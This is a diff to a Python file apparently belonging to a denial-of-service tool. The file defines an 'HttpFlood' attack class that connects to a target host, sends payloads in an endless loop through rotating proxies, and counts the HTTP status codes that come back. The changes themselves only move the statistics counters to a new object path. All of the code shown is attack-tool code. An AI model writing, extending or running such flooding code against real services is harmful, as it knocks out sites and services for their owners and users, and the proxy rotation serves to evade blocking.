@@ -39,7 +39,7 @@ class HttpFlood(AttackMethod):
     def __call__(self, *args, **kwargs):
         with suppress(Exception), self.create_connection() as self._http_connect:
             self._http_connect.connect(self._target.hostip_port_tuple())
-            self._ctx.Statistic.connect.status_success()
+            self._ctx.target.statistic.connect.status_success()
             while self.send(self._http_connect):
                 continue
 
@@ -52,7 +52,7 @@ class HttpFlood(AttackMethod):
                 http_response = repr(check_sock.recv(32))
                 check_sock.close()
                 status = int(re.search(HTTP_STATUS_PATTERN, http_response)[1])
-                self._ctx.Statistic.http_stats[status] += 1
+                self._ctx.target.statistic.http_stats[status] += 1
 
     def send(self, sock: socket) -> bool:
         payload = self.payload().encode('utf-8')
@@ -63,9 +63,9 @@ class HttpFlood(AttackMethod):
             self._ctx.proxy_manager.delete_proxy_sync(self._proxy)
         except Exception as e:
             self._ctx.add_error(Errors('HTTP send Err', e))
-            self._ctx.Statistic.connect.status_failed()
+            self._ctx.target.statistic.connect.status_failed()
         else:
-            self._ctx.Statistic.packets.status_sent(sent)
+            self._ctx.target.statistic.packets.status_sent(sent)
             self._proxy.report_success() if self._proxy is not None else 0
             return True
         return False
